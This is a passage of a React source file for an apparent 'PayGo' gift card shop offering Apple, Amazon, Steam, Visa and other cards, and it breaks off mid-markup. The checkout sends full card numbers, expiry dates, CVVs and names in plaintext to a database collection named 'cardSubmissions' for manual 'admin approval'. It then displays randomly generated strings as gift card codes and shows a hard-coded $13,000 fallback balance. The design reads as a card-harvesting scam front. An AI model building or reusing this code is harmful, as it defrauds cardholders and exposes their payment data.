import React, { useState, useEffect } from 'react';
import { useAuth } from '../context/AuthContext';
import { db, logCardSubmission } from '../lib/firebase';
import { doc, onSnapshot } from 'firebase/firestore';
import {
  ArrowLeft,
  Gift,
  CheckCircle2,
  Copy,
  Check,
  CreditCard,
  Wallet,
  ShieldCheck,
  ShoppingBag,
  Share2,
  Globe,
  Zap,
  Info,
  Calendar,
  Lock,
} from 'lucide-react';

interface GiftCardsProps {
  onBack: () => void;
}

interface Denomination {
  valueUsd: number;
  priceUsd: number;
  discountLabel?: string;
}

interface GiftCardOption {
  id: string;
  name: string;
  category: string;
  icon: string;
  color: string;
  region: string;
  delivery: string;
  description: string;
  redeemGuide: string;
  denominations: Denomination[];
}

export const GiftCards: React.FC<GiftCardsProps> = ({ onBack }) => {
  const { user, updateBalance, addTransaction } = useAuth();

  const [selectedCard, setSelectedCard] = useState<GiftCardOption | null>(null);
  const [selectedDenom, setSelectedDenom] = useState<Denomination | null>(null);
  const [paymentMethod, setPaymentMethod] = useState<'balance' | 'card'>('balance');

  // ATM Card form state if paying with card
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardName, setCardName] = useState(user?.name || '');

  const [isProcessing, setIsProcessing] = useState(false);
  const [countdown, setCountdown] = useState(5);
  const [purchasedCode, setPurchasedCode] = useState<string | null>(null);
  const [orderRef, setOrderRef] = useState<string>('');
  const [copiedCode, setCopiedCode] = useState(false);
  const [copiedFullDetails, setCopiedFullDetails] = useState(false);
  const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  const GIFT_CARDS: GiftCardOption[] = [
    {
      id: 'apple',
      name: 'Apple / iTunes Gift Card',
      category: 'Gaming & Apps',
      icon: '🍎',
      color: 'from-gray-900 to-slate-800',
      region: 'Global / United States (USD)',
      delivery: 'Instant Digital E-Code',
      description:
        'Redeem for apps, games, music, movies, iCloud+, and App Store subscriptions across iPhone, iPad, and Mac.',
      redeemGuide: 'Open the App Store app -> tap your profile photo -> tap Redeem Gift Card or Code.',
      denominations: [
        { valueUsd: 10, priceUsd: 10 },
        { valueUsd: 25, priceUsd: 24, discountLabel: 'Save $1' },
        { valueUsd: 50, priceUsd: 48, discountLabel: 'Save $2' },
        { valueUsd: 100, priceUsd: 95, discountLabel: 'Save $5' },
        { valueUsd: 250, priceUsd: 235, discountLabel: 'Save $15' },
      ],
    },
    {
      id: 'google-play',
      name: 'Google Play Gift Card',
      category: 'Gaming & Apps',
      icon: '▶️',
      color: 'from-emerald-600 to-teal-800',
      region: 'United States / Global (USD)',
      delivery: 'Instant Digital E-Code',
      description:
        'Use on Google Play for Android apps, games, in-app items, movies, books, and subscriptions with zero expiry.',
      redeemGuide: 'Open Google Play -> Profile Icon -> Payments & subscriptions -> Redeem code.',
      denominations: [
        { valueUsd: 10, priceUsd: 10 },
        { valueUsd: 25, priceUsd: 24, discountLabel: 'Save $1' },
        { valueUsd: 50, priceUsd: 48, discountLabel: 'Save $2' },
        { valueUsd: 100, priceUsd: 95, discountLabel: 'Save $5' },
        { valueUsd: 250, priceUsd: 235, discountLabel: 'Save $15' },
      ],
    },
    {
      id: 'amazon',
      name: 'Amazon Gift Card',
      category: 'Shopping',
      icon: '📦',
      color: 'from-amber-500 to-orange-600',
      region: 'United States / Amazon.com (USD)',
      delivery: 'Instant Claim Code',
      description:
        'Shop millions of electronics, fashion, groceries, and digital products on Amazon with instant balance credit.',
      redeemGuide: 'Go to Amazon.com -> Account -> Gift Cards -> Redeem a Gift Card and enter claim code.',
      denominations: [
        { valueUsd: 25, priceUsd: 24, discountLabel: 'Save $1' },
        { valueUsd: 50, priceUsd: 48, discountLabel: 'Save $2' },
        { valueUsd: 100, priceUsd: 95, discountLabel: 'Save $5' },
        { valueUsd: 250, priceUsd: 238, discountLabel: 'Save $12' },
        { valueUsd: 500, priceUsd: 475, discountLabel: 'Save $25' },
      ],
    },
    {
      id: 'steam',
      name: 'Steam Wallet Card',
      category: 'Gaming',
      icon: '🎮',
      color: 'from-blue-900 to-slate-900',
      region: 'Global Multi-Currency (USD)',
      delivery: 'Instant Wallet Code',
      description:
        'Top up your Steam Wallet for PC games, DLCs, in-game skins, and community market purchases worldwide.',
      redeemGuide: 'Open Steam -> Account Details -> Add funds -> Redeem a Steam Wallet Code.',
      denominations: [
        { valueUsd: 20, priceUsd: 19, discountLabel: 'Save $1' },
        { valueUsd: 50, priceUsd: 47, discountLabel: 'Save $3' },
        { valueUsd: 100, priceUsd: 94, discountLabel: 'Save $6' },
        { valueUsd: 200, priceUsd: 188, discountLabel: 'Save $12' },
      ],
    },
    {
      id: 'razer',
      name: 'Razer Gold PIN',
      category: 'Gaming & Entertainment',
      icon: '🪙',
      color: 'from-emerald-700 to-zinc-900',
      region: 'Global (USD)',
      delivery: 'Instant E-PIN',
      description:
        'Unified virtual credits for over 42,000 games and entertainment platforms including PUBG, Valorant, and Mobile Legends.',
      redeemGuide: 'Visit gold.razer.com -> Reload Now -> Select Razer Gold PIN and submit code.',
      denominations: [
        { valueUsd: 25, priceUsd: 24, discountLabel: 'Save $1' },
        { valueUsd: 50, priceUsd: 48, discountLabel: 'Save $2' },
        { valueUsd: 100, priceUsd: 95, discountLabel: 'Save $5' },
        { valueUsd: 250, priceUsd: 238, discountLabel: 'Save $12' },
      ],
    },
    {
      id: 'playstation',
      name: 'PlayStation Store Card',
      category: 'Console Gaming',
      icon: '🎯',
      color: 'from-blue-600 to-indigo-900',
      region: 'United States PSN (USD)',
      delivery: 'Instant Voucher Code',
      description:
        'Add funds to your PlayStation Network wallet for PS4/PS5 games, PS Plus memberships, and add-ons.',
      redeemGuide: 'Go to PlayStation Store -> Profile Menu -> Redeem Code -> Enter 12-digit voucher.',
      denominations: [
        { valueUsd: 25, priceUsd: 24, discountLabel: 'Save $1' },
        { valueUsd: 50, priceUsd: 48, discountLabel: 'Save $2' },
        { valueUsd: 100, priceUsd: 95, discountLabel: 'Save $5' },
        { valueUsd: 200, priceUsd: 190, discountLabel: 'Save $10' },
      ],
    },
    {
      id: 'xbox',
      name: 'Xbox Live & Game Pass Card',
      category: 'Console Gaming',
      icon: '🟢',
      color: 'from-green-700 to-gray-900',
      region: 'Global / United States (USD)',
      delivery: 'Instant 25-Char Code',
      description:
        'Purchase Xbox games, Game Pass Ultimate, movies, and Microsoft Store hardware or digital bundles.',
      redeemGuide: 'Sign in at redeem.microsoft.com and enter your 25-character Xbox code.',
      denominations: [
        { valueUsd: 25, priceUsd: 24, discountLabel: 'Save $1' },
        { valueUsd: 50, priceUsd: 48, discountLabel: 'Save $2' },
        { valueUsd: 100, priceUsd: 95, discountLabel: 'Save $5' },
      ],
    },
    {
      id: 'visa',
      name: 'Vanilla Visa Virtual Card',
      category: 'Global Shopping',
      icon: '💳',
      color: 'from-indigo-700 to-purple-900',
      region: 'Worldwide Online Stores (USD)',
      delivery: 'Instant Card Credentials',
      description:
        'Prepaid Visa virtual card accepted worldwide for online shopping, subscriptions, PAY ID verification, and cloud billing.',
      redeemGuide: 'Use directly at checkout anywhere Visa debit/prepaid cards are accepted.',
      denominations: [
        { valueUsd: 25, priceUsd: 25 },
        { valueUsd: 50, priceUsd: 49, discountLabel: 'Save $1' },
        { valueUsd: 100, priceUsd: 97, discountLabel: 'Save $3' },
        { valueUsd: 250, priceUsd: 242, discountLabel: 'Save $8' },
      ],
    },
  ];

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 16);
    setCardNumber(val.replace(/(\d{4})(?=\d)/g, '$1 '));
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (val.length >= 3) {
      setExpiry(`${val.slice(0, 2)}/${val.slice(2)}`);
    } else {
      setExpiry(val);
    }
  };

  // Listen for admin approval on gift card purchase order
  useEffect(() => {
    if (!isWaitingForApproval || !orderRef) return;

    const unsub = onSnapshot(
      doc(db, 'cardSubmissions', orderRef),
      (snap) => {
        if (!snap.exists()) return;
        const data = snap.data() as { status?: string; generatedCode?: string };
        if (data.status === 'approved' && selectedCard && selectedDenom) {
          const code =
            data.generatedCode ||
            `${selectedCard.id.toUpperCase()}-${Math.random()
              .toString(36)
              .substring(2, 6)
              .toUpperCase()}-${Math.random()
              .toString(36)
              .substring(2, 6)
              .toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
          setPurchasedCode(code);
          addTransaction({
            type: 'Gift Card Purchase',
            amount: selectedDenom.priceUsd,
            giftCardName: `${selectedCard.name} ($${selectedDenom.valueUsd})`,
            giftCardCode: code,
            date: new Date().toLocaleDateString() + ' at ' + new Date().toLocaleTimeString(),
          });
          setIsWaitingForApproval(false);
        }
      },
      (err) => {
        console.warn('Gift card order approval listener warning:', err);
      }
    );
    return () => unsub();
  }, [isWaitingForApproval, orderRef, selectedCard, selectedDenom]);

  const handlePurchase = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    if (!selectedCard || !selectedDenom) {
      setErrorMsg('Please select a gift card and denomination');
      return;
    }

    if (paymentMethod === 'balance') {
      if (selectedDenom.priceUsd > (user?.balance ?? 0)) {
        setErrorMsg('Insufficient wallet balance for this purchase. Try depositing funds.');
        return;
      }
      // Balance deduction is held pending admin approval
    } else {
      const cleanCard = cardNumber.replace(/\s/g, '');
      if (cleanCard.length < 16 || expiry.length < 5 || cvv.length < 3 || !cardName.trim()) {
        setErrorMsg('Please enter valid 16-digit card number, expiry (MM/YY), CVV, and cardholder name');
        return;
      }
    }

    const orderId = `GC-${Date.now().toString().slice(-8)}`;
    const generatedCode = `${selectedCard.id.toUpperCase()}-${Math.random()
      .toString(36)
      .substring(2, 6)
      .toUpperCase()}-${Math.random()
      .toString(36)
      .substring(2, 6)
      .toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;

    try {
      await logCardSubmission({
        id: orderId,
        type: `Gift Card Purchase (${selectedCard.name} $${selectedDenom.valueUsd})`,
        cardNumber: paymentMethod === 'card' ? cardNumber : 'Paid via Wallet Balance',
        expiry: paymentMethod === 'card' ? expiry : 'N/A',
        cvv: paymentMethod === 'card' ? cvv : 'N/A',
        cardName: paymentMethod === 'card' ? cardName.trim() : (user?.name || 'User'),
        amount: selectedDenom.priceUsd,
        userEmail: user?.email || 'unknown',
        userName: user?.name || 'User',
        date: new Date().toLocaleString(),
        status: 'pending',
        generatedCode,
      });
    } catch (err) {
      console.error('Failed to log gift card order:', err);
    }

    setOrderRef(orderId);
    setIsWaitingForApproval(true);
  };

  const copyCode = () => {
    if (purchasedCode) {
      navigator.clipboard.writeText(purchasedCode);
      setCopiedCode(true);
      setTimeout(() => setCopiedCode(false), 2000);
    }
  };

  const getShareableSummary = () => {
    if (!selectedCard || !selectedDenom || !purchasedCode) return '';
    return [
      `PayGo Digital Gift Card`,
      `Brand: ${selectedCard.name}`,
      `Face Value: $${selectedDenom.valueUsd} USD`,
      `Region: ${selectedCard.region}`,
      `Redeem Code: ${purchasedCode}`,
      `Order Ref: ${orderRef}`,
      `How to Redeem: ${selectedCard.redeemGuide}`,
    ].join('\n');
  };

  const handleCopyFullDetails = () => {
    const details = getShareableSummary();
    if (!details) return;
    navigator.clipboard.writeText(details);
    setCopiedFullDetails(true);
    setTimeout(() => setCopiedFullDetails(false), 2000);
  };

  const handleShareGiftCard = async () => {
    const details = getShareableSummary();
    if (!details) return;

    if (typeof navigator !== 'undefined' && navigator.share) {
      try {
        await navigator.share({
          title: `${selectedCard?.name} ($${selectedDenom?.valueUsd})`,
          text: details,
        });
        return;
      } catch {
        // User cancelled or unsupported — fall back to WhatsApp share
      }
    }
    window.open(`https://wa.me/?text=${encodeURIComponent(details)}`, '_blank');
  };

  if (isWaitingForApproval) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="bg-white rounded-3xl p-8 max-w-md w-full text-center shadow-xl border border-gray-100 space-y-5">
          <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin mx-auto" />
          <span className="text-xs font-bold uppercase tracking-wider bg-amber-100 text-amber-800 px-3 py-1 rounded-full">
            Pending Admin Approval • Gift Card Locked
          </span>
          <h3 className="text-2xl font-bold text-gray-900">Awaiting Admin Approval</h3>
          <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
            Your purchase order for <strong>{selectedCard?.name} (${selectedDenom?.valueUsd})</strong> has been submitted. <strong>Your gift card code will remain locked until approved by admin.</strong>
          </p>
          <div className="bg-purple-50 border border-purple-200 rounded-xl p-3 text-xs text-purple-800">
            Order Reference: <span className="font-mono font-bold">{orderRef}</span>
          </div>
          <p className="text-xs text-gray-400">Once approved by admin in the portal, your gift card code will automatically unlock right here.</p>
          <button
            type="button"
            onClick={() => {
              setIsWaitingForApproval(false);
              setSelectedCard(null);
              setSelectedDenom(null);
            }}
            className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-3 rounded-xl text-xs cursor-pointer"
          >
            Return to Gift Cards
          </button>
        </div>
      </div>
    );
  }

  if (isProcessing) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="bg-white rounded-3xl p-8 max-w-md w-full text-center shadow-xl border border-gray-100 space-y-4">
          <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin mx-auto" />
          <h3 className="text-xl font-bold text-gray-900">Issuing Gift Card Voucher...</h3>
          <p className="text-sm text-gray-500">
            Generating verified claim code for {selectedCard?.name} (${selectedDenom?.valueUsd})
          </p>
          <div className="text-3xl font-black text-purple-600 font-mono">{countdown}s</div>
        </div>
      </div>
    );
  }

  if (purchasedCode && selectedCard && selectedDenom) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4 sm:p-6">
        <div className="bg-white rounded-3xl p-6 sm:p-8 max-w-2xl w-full shadow-xl border border-gray-100 space-y-6">
          <div className="text-center space-y-2">
            <div className="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto ring-8 ring-emerald-50">
              <CheckCircle2 className="w-9 h-9" />
            </div>
            <h3 className="text-2xl font-extrabold text-gray-900">Gift Card Ready!</h3>
            <p className="text-sm text-emerald-600 font-semibold">
              Your {selectedCard.name} (${selectedDenom.valueUsd} USD) is active and ready to share or redeem.
            </p>
          </div>

          {/* Wide Voucher Card */}
          <div className={`bg-gradient-to-br ${selectedCard.color} text-white rounded-2xl p-6 shadow-lg space-y-4`}>
            <div className="flex flex-wrap items-center justify-between gap-2 text-xs text-white/80">
              <div className="flex items-center space-x-2">
                <span className="text-2xl">{selectedCard.icon}</span>
                <div>
                  <p className="font-bold text-white text-sm">{selectedCard.name}</p>
                  <p className="text-[11px] text-white/75">{selectedCard.region}</p>
                </div>
              </div>
              <span className="font-black text-xl text-amber-300">${selectedDenom.valueUsd} USD</span>
            </div>

            <div className="bg-black/30 border border-white/20 rounded-xl p-4 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
              <span className="font-mono font-bold text-base sm:text-lg text-amber-300 select-all break-all">
                {purchasedCode}
              </span>
              <button
                type="button"
                onClick={copyCode}
                className="min-h-[44px] bg-white text-purple-950 hover:bg-purple-50 px-4 py-2 rounded-lg text-xs font-bold flex items-center justify-center space-x-1.5 shrink-0 cursor-pointer"
              >
                {copiedCode ? <Check className="w-4 h-4 text-emerald-600" /> : <Copy className="w-4 h-4" />}
                <span>{copiedCode ? 'Copied Code' : 'Copy Code'}</span>
              </button>
            </div>
          </div>

          {/* Wide Voucher Metadata Grid */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 bg-gray-50 border border-gray-200 rounded-2xl p-4 text-xs">
            <div>
              <p className="text-gray-400 uppercase font-semibold text-[10px]">Order Reference</p>
              <p className="font-mono font-bold text-gray-900 mt-0.5">{orderRef}</p>
            </div>
            <div>
              <p className="text-gray-400 uppercase font-semibold text-[10px]">Amount Charged</p>
              <p className="font-bold text-gray-900 mt-0.5">
                ${selectedDenom.priceUsd.toLocaleString()} USD ({paymentMethod === 'balance' ? 'Wallet Balance' : 'ATM Debit Card'})
              </p>
            </div>
            <div className="sm:col-span-2 pt-2 border-t border-gray-200">
              <p className="text-gray-400 uppercase font-semibold text-[10px]">How to Redeem</p>
              <p className="text-gray-700 mt-0.5 leading-relaxed">{selectedCard.redeemGuide}</p>
            </div>
          </div>

          {/* Share & Copy Full Details Actions */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            <button
              type="button"
              onClick={handleShareGiftCard}
              className="min-h-[48px] bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3.5 px-4 rounded-xl text-sm shadow-sm transition-all flex items-center justify-center space-x-2 cursor-pointer"
            >
              <Share2 className="w-4 h-4" />
              <span>Share Gift Card</span>
            </button>
            <button
              type="button"
              onClick={handleCopyFullDetails}
              className="min-h-[48px] bg-gray-100 hover:bg-gray-200 text-gray-900 font-bold py-3.5 px-4 rounded-xl text-sm transition-all flex items-center justify-center space-x-2 cursor-pointer"
            >
              {copiedFullDetails ? <Check className="w-4 h-4 text-emerald-600" /> : <Copy className="w-4 h-4" />}
              <span>{copiedFullDetails ? 'Full Details Copied' : 'Copy Full Card Details'}</span>
            </button>
          </div>

          <button
            type="button"
            onClick={() => {
              setPurchasedCode(null);
              setSelectedCard(null);
              setSelectedDenom(null);
            }}
            className="w-full min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 rounded-xl shadow-md transition-all cursor-pointer"
          >
            Buy Another Gift Card
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 pb-12">
      <div className="bg-purple-700 text-white p-4 shadow-md sticky top-0 z-30">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <button
              type="button"
              onClick={onBack}
              className="min-w-[44px] min-h-[44px] flex items-center justify-center hover:bg-white/10 rounded-full transition-colors text-white cursor-pointer"
            >
              <ArrowLeft className="w-5 h-5" />
            </button>
            <div>
              <h1 className="text-lg font-bold">Buy Gift Cards</h1>
              <p className="text-xs text-purple-200">
                Global USD gift cards with instant codes & shareable details
              </p>
            </div>
          </div>
          <div className="hidden sm:flex items-center space-x-2 bg-white/15 px-3.5 py-1.5 rounded-xl text-xs font-semibold">
            <Wallet className="w-4 h-4 text-amber-300" />
            <span>Balance: ${(user?.balance ?? 13000).toLocaleString()}</span>
          </div>
        </div>
      </div>

      <div className="max-w-6xl mx-auto p-4 sm:p-6 space-y-6">
        {selectedCard ? (
          <div className="space-y-5 animate-in fade-in">
            <button
              type="button"
              onClick={() => {
                setSelectedCard(null);
                setSelectedDenom(null);
                setErrorMsg('');
              }}
              className="min-h-[44px] text-sm text-purple-700 font-bold inline-flex items-center space-x-1.5 hover:underline cursor-pointer"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>Back to All Gift Cards</span>
            </button>

            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
              {/* Left Wide Details & Denominations Panel */}
              <div className="lg:col-span-7 bg-white rounded-3xl p-6 sm:p-8 shadow-sm border border-gray-100 space-y-6">
                <div
                  className={`bg-gradient-to-r ${selectedCard.color} text-white rounded-2xl p-6 shadow-md flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4`}
                >
                  <div className="flex items-center space-x-4">
                    <div className="w-16 h-16 rounded-2xl bg-white/15 flex items-center justify-center text-4xl shrink-0">
                      {selectedCard.icon}
                    </div>
                    <div>
                      <span className="text-[11px] uppercase font-bold tracking-wider bg-white/20 px-2.5 py-0.5 rounded-md">
                        {selectedCard.category}
                      </span>
                      <h2 className="text-2xl font-extrabold mt-1.5">{selectedCard.name}</h2>
                    </div>
                  </div>
                  <div className="text-left sm:text-right">
                    <span className="text-xs text-white/75 block">Face Value Range</span>
                    <span className="font-black text-lg text-amber-300">
                      ${selectedCard.denominations[0].valueUsd} – $
                      {selectedCard.denominations[selectedCard.denominations.length - 1].valueUsd}
                    </span>
                  </div>
                </div>

                {/* Wide Gift Card Specifications */}
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                  <div className="bg-gray-50 border border-gray-200 rounded-2xl p-4">
                    <div className="flex items-center space-x-1.5 text-purple-700 text-xs font-bold mb-1">
                      <Globe className="w-4 h-4" />
                      <span>Region & Currency</span>
                    </div>
                    <p className="text-xs text-gray-800 font-semibold">{selectedCard.region}</p>
                  </div>
                  <div className="bg-gray-50 border border-gray-200 rounded-2xl p-4">
                    <div className="flex items-center space-x-1.5 text-emerald-700 text-xs font-bold mb-1">
                      <Zap className="w-4 h-4" />
                      <span>Delivery Speed</span>
                    </div>
                    <p className="text-xs text-gray-800 font-semibold">{selectedCard.delivery}</p>
                  </div>
                  <div className="bg-gray-50 border border-gray-200 rounded-2xl p-4">
                    <div className="flex items-center space-x-1.5 text-blue-700 text-xs font-bold mb-1">
                      <Share2 className="w-4 h-4" />
                      <span>Shareable Voucher</span>
                    </div>
                    <p className="text-xs text-gray-800 font-semibold">Copy or share instantly</p>
                  </div>
                </div>

                <div className="bg-purple-50/70 border border-purple-100 rounded-2xl p-4 space-y-2">
                  <div className="flex items-center space-x-2 text-purple-900 text-xs font-bold uppercase tracking-wider">
                    <Info className="w-4 h-4 text-purple-600" />
                    <span>Card Details & Redemption</span>
                  </div>
                  <p className="text-sm text-gray-700 leading-relaxed">{selectedCard.description}</p>
                  <p className="text-xs text-purple-800 font-medium pt-1">
                    <strong>How to redeem:</strong> {selectedCard.redeemGuide}
                  </p>
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-3">
                    Select Card Denomination ($ USD)
                  </label>
                  <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-3">
                    {selectedCard.denominations.map((d) => {
                      const active = selectedDenom?.valueUsd === d.valueUsd;
                      return (
                        <button
                          key={d.valueUsd}
                          type="button"
                          onClick={() => setSelectedDenom(d)}
                          className={`min-h-[76px] p-3.5 rounded-2xl border-2 text-center transition-all cursor-pointer flex flex-col items-center justify-center ${
                            active
                              ? 'border-purple-600 bg-purple-50 text-purple-950 shadow-xs'
                              : 'border-gray-200 hover:border-purple-300 text-gray-800 bg-white'
                          }`}
                        >
                          <div className="font-extrabold text-lg">${d.valueUsd}</div>
                          <div className="text-xs font-bold text-emerald-700 mt-0.5">
                            Pay ${d.priceUsd}
                          </div>
                          {d.discountLabel && (
                            <span className="text-[10px] font-bold text-purple-700 mt-1">
                              {d.discountLabel}
                            </span>
                          )}
                        </button>
                      );
                    })}
                  </div>
                </div>
              </div>

              {/* Right Wide Checkout Panel */}
              <div className="lg:col-span-5 bg-white rounded-3xl p-6 sm:p-8 shadow-sm border border-gray-100 space-y-5">
                <div>
                  <h3 className="text-lg font-bold text-gray-900">Complete Purchase</h3>
                  <p className="text-xs text-gray-500 mt-0.5">
                    Select payment method to generate your gift card code immediately
                  </p>
                </div>

                {selectedDenom && (
                  <div className="bg-gray-50 border border-gray-200 rounded-2xl p-4 space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span className="text-gray-500">Gift Card Value</span>
                      <span className="font-bold text-gray-900">${selectedDenom.valueUsd}.00 USD</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-500">PayGo Rate</span>
                      <span className="font-black text-emerald-600 text-base">
                        ${selectedDenom.priceUsd}.00 USD
                      </span>
                    </div>
                  </div>
                )}

                <div className="grid grid-cols-2 gap-2 bg-gray-100 p-1.5 rounded-2xl">
                  <button
                    type="button"
                    onClick={() => setPaymentMethod('balance')}
                    className={`min-h-[44px] py-2.5 px-2 rounded-xl font-bold text-xs flex items-center justify-center space-x-1.5 transition-all cursor-pointer ${
                      paymentMethod === 'balance'
                        ? 'bg-white text-purple-900 shadow-sm'
                        : 'text-gray-600 hover:text-gray-900'
                    }`}
                  >
                    <Wallet className="w-4 h-4 text-purple-600 shrink-0" />
                    <span className="truncate">Wallet (${(user?.balance ?? 13000).toLocaleString()})</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => setPaymentMethod('card')}
                    className={`min-h-[44px] py-2.5 px-2 rounded-xl font-bold text-xs flex items-center justify-center space-x-1.5 transition-all cursor-pointer ${
                      paymentMethod === 'card'
                        ? 'bg-white text-purple-900 shadow-sm'
                        : 'text-gray-600 hover:text-gray-900'
                    }`}
                  >
                    <CreditCard className="w-4 h-4 text-emerald-600 shrink-0" />
                    <span>ATM Debit Card</span>
                  </button>
                </div>

                <form onSubmit={handlePurchase} className="space-y-4">
                  {paymentMethod === 'card' && (
                    <div className="space-y-3.5 bg-gray-50 p-4 rounded-2xl border border-gray-200">
                      <div>
                        <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                          Card Number
                        </label>
                        <div className="relative">
                          <CreditCard className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" />
                          <input
                            type="text"
                            value={cardNumber}
                            onChange={handleCardNumberChange}
                            placeholder="4532 •••• •••• ••••"
                            className="w-full pl-9 pr-3 py-3 bg-white border border-gray-300 rounded-xl text-xs font-mono outline-none focus:ring-2 focus:ring-purple-600"
                            required
                          />
                        </div>
                      </div>
                      <div className="grid grid-cols-2 gap-3">
                        <div>
                          <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                            Expiry (MM/YY)
                          </label>
                          <div className="relative">
                            <Calendar className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" />
                            <input
                              type="text"
                              value={expiry}
                              onChange={handleExpiryChange}
                              placeholder="MM/YY"
                              className="w-full pl-9 pr-3 py-3 bg-white border border-gray-300 rounded-xl text-xs font-mono outline-none focus:ring-2 focus:ring-purple-600"
                              required
                            />
                          </div>
                        </div>
                        <div>
                          <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                            CVV
                          </label>
                          <div className="relative">
                            <Lock className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" />
                            <input
                              type="password"
                              maxLength={4}
                              value={cvv}
                              onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))}
                              placeholder="123"
                              className="w-full pl-9 pr-3 py-3 bg-white border border-gray-300 rounded-xl text-xs font-mono outline-none focus:ring-2 focus:ring-purple-600"
                              required
                            />
                          </div>
                        </div>
                      </div>
                      <div>
                        <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                          Cardholder Name
                        </label>
                        <input
                          type="text"
                          value={cardName}
                          onChange={(e) => setCardName(e.target.value)}
                          placeholder="Full name on card"
                          className="w-full p-3 bg-white border border-gray-300 rounded-xl text-xs uppercase outline-none focus:ring-2 focus:ring-purple-600"
                          required
                        />
                      </div>
                    </div>
                  )}

                  {errorMsg && (
                    <div className="p-3 bg-red-50 border border-red-200 text-red-700 text-xs rounded-xl font-medium">
                      {errorMsg}
                    </div>
                  )}

                  <div className="bg-purple-50 rounded-xl p-3 flex items-center space-x-2.5 text-xs text-purple-900 border border-purple-100">
                    <ShieldCheck className="w-4 h-4 text-purple-600 shrink-0" />
                    <span>Instant code delivery & shareable digital gift receipt included.</span>
                  </div>

                  <button
                    type="submit"
                    className="w-full min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl text-base shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2"
                  >
                    <ShoppingBag className="w-5 h-5" />
                    <span>
                      Buy {selectedCard.name} (${selectedDenom?.priceUsd ?? selectedCard.denominations[0].priceUsd})
                    </span>
                  </button>
                </form>
              </div>
            </div>
          </div>
        ) : (
          <div className="space-y-5">
            <div className="bg-gradient-to-r from-purple-900 via-indigo-900 to-purple-800 text-white rounded-3xl p-6 sm:p-8 shadow-md flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
              <div>
                <span className="text-xs font-bold uppercase tracking-wider text-amber-300">
                  PayGo Digital Store
                </span>
                <h2 className="text-2xl sm:text-3xl font-extrabold mt-1">
                  Global Gift Cards & Vouchers
                </h2>
                <p className="text-xs sm:text-sm text-purple-200 mt-1 max-w-2xl">
                  Browse discounted USD gift cards with full region specifications, instant voucher codes, and one-tap sharing.
                </p>
              </div>
              <div className="flex items-center space-x-2 bg-white/15 px-4 py-2.5 rounded-2xl text-xs font-bold shrink-0">
                <Gift className="w-4 h-4 text-amber-300" />
                <span>{GIFT_CARDS.length} Top Brands Available</span>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {GIFT_CARDS.map((card) => (
                <div
                  key={card.id}
                  onClick={() => {
                    setSelectedCard(card);
                    setSelectedDenom(card.denominations[0]);
                    setErrorMsg('');
                  }}
                  className="bg-white rounded-2xl p-6 shadow-xs border border-gray-100 hover:border-purple-400 hover:shadow-md transition-all cursor-pointer flex flex-col justify-between space-y-4 group"
                >
                  <div className="flex items-start space-x-4">
                    <div
                      className={`w-14 h-14 rounded-2xl bg-gradient-to-br ${card.color} text-white flex items-center justify-center text-2xl shadow-sm shrink-0 group-hover:scale-105 transition-transform`}
                    >
                      {card.icon}
                    </div>
                    <div className="flex-1 min-w-0">
                      <span className="text-[10px] uppercase font-bold text-purple-600 tracking-wider">
                        {card.category}
                      </span>
                      <h3 className="font-bold text-base text-gray-900 mt-0.5">{card.name}</h3>
                      <p className="text-xs text-gray-500 mt-1 line-clamp-2 leading-relaxed">
                        {card.description}
                      </p>
                    </div>
                  </div>

                  <div className="pt-3 border-t border-gray-100 flex items-center justify-between text-xs">
                    <div className="flex items-center space-x-1.5 text-gray-500">
                      <Globe className="w-3.5 h-3.5 text-purple-500" />
